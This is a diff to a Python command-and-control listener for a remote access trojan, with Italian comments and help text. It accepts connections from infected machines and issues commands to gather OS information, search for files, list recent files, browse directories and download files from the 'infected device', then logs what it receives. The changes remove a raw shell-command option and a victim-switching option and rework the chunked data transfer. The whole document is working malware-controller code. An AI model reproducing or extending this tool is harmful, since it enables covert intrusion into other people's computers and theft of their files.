@@ -3,7 +3,7 @@ from socket import *
 import time
 from threading import Thread
 
-serverPort = 12000
+serverPort = 12018
 
 windowsFlag = "n"
 stop_threads = False
@@ -11,23 +11,24 @@ pwd = "unknown"
 
 
 def animation():
-    i = 0
     while True:
         global stop_threads
         if stop_threads:
             break
-        if i < 10:
-            print(".", end = "")
-            i = i + 1
-        else:
-            print("\n")
-            i = 0
+        print(".")
         time.sleep(1)
+
+
+def receiveDir(connectionSocket):
+    outputSize = int(connectionSocket.recv(1024).decode())
+    connectionSocket.send("OK".encode())
+    out = connectionSocket.recv(outputSize).decode()
+    print(out)
 
 
 def exitNClose(connectionSocket, cmd):
     connectionSocket.send(cmd.encode())
-    #out = connectionSocket.recv(1024).decode()
+    out = connectionSocket.recv(1024).decode()
     connectionSocket.close()
     return True
 
@@ -66,7 +67,7 @@ def StartConnection():  # funzione di connessione (da controllare)
     serverPort = serverPort
     serverSocket = socket(AF_INET, SOCK_STREAM)
     serverSocket.bind(('', serverPort))
-    serverSocket.listen(0)
+    serverSocket.listen(1)
     print('Server Ready')
     while True:
         connectionSocket, addr = serverSocket.accept()
@@ -75,7 +76,7 @@ def StartConnection():  # funzione di connessione (da controllare)
         if addr:
             break
 
-    return (connectionSocket,serverSocket)
+    return connectionSocket
 
 
 def AssegnaWinFlag(connectionSocket: socket):
@@ -90,7 +91,6 @@ def LogOnFile(nomeFile: str, strPerFile: str):
 
 
 def searchFile(connectionSocket, fileName):
-    output = ""
     global windowsFlag
     if windowsFlag == "w":
         cmd = "dir \"" + fileName + "\" /a /s"
@@ -106,47 +106,50 @@ def searchFile(connectionSocket, fileName):
     stop_threads = False
     t = Thread(target=animation)
     t.start()
-    output = longRecv(connectionSocket)
-    print(output)
+    SizeOrError = connectionSocket.recv(1024).decode()  # 92 or 99
     stop_threads = True
-    LogOnFile("ricercaFile.txt", output)
+    if SizeOrError == "notFound":
+        output = "File not found"
+        print("Ricerca fallita")
+    else:
+        pSize = int(SizeOrError)
+        mex = "Server pronto a ricevere l'output"
+        connectionSocket.send(mex.encode())  # 100
 
+        output: bytes
+        output = connectionSocket.recv(1024)
+        pSize -= 1024
+        while pSize > 0:
+            output = output.__add__(connectionSocket.recv(1024))
+            # print(connectionSocket.recv(1024).decode())
+            pSize -= 1024
+            print(". . .")
 
-#def longRecv(connectionSocket):
-#    numofpackets = int(connectionSocket.recv(1024).decode())
-#    output = ""
+        print(output.decode())
+        LogOnFile("ricercaFile.txt", output.decode())
 
-#    while numofpackets > 0:
-#        data = connectionSocket.recv(1024)
-#        output += data.decode()
-#        numofpackets = numofpackets - 1
-
-#    print(output)
-#    return output
-
-def longRecv(serverSocket: socket):
-    ln = serverSocket.recv(1024).decode()
-    lung = int(ln)
-    serverSocket.send("hello".encode())
-    result: bytes
-    result = serverSocket.recv(1024)
-    serverSocket.send("a".encode())
-    for i in range(1, lung):
-        result = result.__add__(serverSocket.recv(1024))
-        serverSocket.send("a".encode())
-
-    return result.decode()
+    return output.decode()
 
 
 def recentFiles(connectionSocket: socket):
-    global stop_threads
-    stop_threads = False
-    t = Thread(target=animation)
-    t.start()
-    output = longRecv(connectionSocket)
-    stop_threads = True
-    print(output)
-    LogOnFile("rf.txt", output)
+
+    pSize = int(connectionSocket.recv(1024).decode())
+    mex = "Server pronto a ricevere l'output"
+    connectionSocket.send(mex.encode())
+    #output = connectionSocket.recv(pSize)
+
+    #idea @fede
+    output: bytes
+    output = connectionSocket.recv(1024)
+    pSize -= 1024
+    while pSize > 0:
+        output = output.__add__(connectionSocket.recv(1024))
+        pSize -= 1024
+        print(". . .")
+
+
+    print(output.decode())
+    LogOnFile("rf.txt", output.decode())
 
 
 def clearScreen():
@@ -156,38 +159,21 @@ def clearScreen():
     else:
         os.system("clear")
 
-def nextIp(connectionSocket: socket,serverSocket):
-    global windowsFlag
-    connectionSocket.close()
-    while True:
-        connectionSocket, addr = serverSocket.accept()
-        print('Connesso', addr)
-
-        if addr:
-            break
-
-    windowsFlag = connectionSocket.recv(1024)
-    print(windowsFlag)
-
-    #connectionSocket.send(next)
-    return (connectionSocket,serverSocket)
-
-
 
 def main():
     global windowsFlag, pwd
     esc = False
     while not esc:
         try:
-            connectionSocket,serverSocket = StartConnection()  # apriamo connessione e inizializziamo
+            connectionSocket = StartConnection()  # apriamo connessione e inizializziamo
             AssegnaWinFlag(connectionSocket)
             connectionSocket.send("cd .".encode())
             pwd = connectionSocket.recv(1024).decode()
             help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
-                    "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
-                    "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
-                    "directory \ncls                             clear console\npwd                             print working directory \nsetOs to change osType" \
-                    "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]\nnsf [comando shell]             esegue comando shell [potrebbe crashare se non esiste]"
+                   "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
+                   "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
+                   "directory \ncls                             clear console\npwd                             print working directory \nsetOs to change osType" \
+                   "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]"
             while not esc:
                 cmd = input('>>')
                 connectionSocket.send(cmd.encode())
@@ -196,13 +182,12 @@ def main():
                     print("cls")
                     clearScreen()
 
-                elif "nsf" in cmd:
-                    output = longRecv(connectionSocket)
-                    print(output)
-
                 elif cmd == "setOs":
                     global windowsFlag
                     windowsFlag = input()
+
+                elif cmd == "dir" or "ls" in cmd:
+                    receiveDir(connectionSocket)
 
                 elif cmd == "esc":
                     esc = exitNClose(connectionSocket, cmd)
@@ -217,14 +202,14 @@ def main():
                         getFile(connectionSocket, fileName)
 
                 elif cmd == "infoOs":
-                    d = longRecv(connectionSocket)
+                    d = connectionSocket.recv(1024).decode()
                     print(d)
                     LogOnFile("infoOs.txt", d)
 
                 elif "search" in cmd:
                     cmd = cmd + " "
                     toSearch = cmd.replace("search ", "")
-                    searchFile(connectionSocket, toSearch)
+                    output = searchFile(connectionSocket, toSearch)
 
                 elif cmd == "help":
                     print(help)
@@ -242,22 +227,11 @@ def main():
                         else:
                             recentFiles(connectionSocket)
 
-                elif "dir" in cmd or "ls" in cmd:
-                    output = longRecv(connectionSocket)
-                    print(output)
-                elif cmd == "next":
-                    connectionSocket,serverSocket = nextIp(connectionSocket,serverSocket)
-                    connectionSocket.send("cd .".encode())
-                    pwd = connectionSocket.recv(1024).decode()
-
-
-
         except Exception as e:
             print(e)
             print("Errore! Riavvio in corso")
             connectionSocket.close()
 
-    connectionSocket.close()
 
 if __name__ == "__main__":
     main()
